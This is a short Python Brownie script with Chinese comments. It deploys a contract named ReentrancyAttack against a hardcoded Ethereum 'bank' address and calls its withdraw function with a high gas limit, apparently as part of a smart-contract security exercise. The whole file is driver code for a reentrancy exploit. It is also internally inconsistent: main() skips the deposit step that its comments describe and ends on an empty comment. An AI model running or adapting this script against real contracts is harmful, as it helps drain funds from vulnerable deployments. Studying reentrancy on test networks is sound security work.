from brownie import ReentrancyAttack, accounts, Wei

# 部署智能合约
def deploy_bank_Attack(bank_address):
    account = accounts.load("test1")
    bank_attack = ReentrancyAttack.deploy(bank_address, {"from": account})
    return bank_attack

# 存款
def deposit_bank(bank_attack):
    account = accounts[0]
    deposit_amount = Wei("0.01 ether")  
    transaction = bank_attack.doDeposit({"from": account, "value": deposit_amount})
    transaction.wait(1)
    print("Deposit successful")

# 取款
def withdraw_bank(bank_attack):
    account = accounts[0]
    transaction = bank_attack.doWithdraw({"from": account,"gas_price":0.01,"gas_limit":12000000,"allow_revert":True})
    transaction.wait(1)
    print("Withdraw successful")

def main():
    # 部署合约
    bank_address = "0x3154D2393884EFf10A8434cB7795340d607A0B9F"
    bank_attack = deploy_bank_Attack(bank_address)
    # 存款
    withdraw_bank(bank_attack)
    # 取款
   
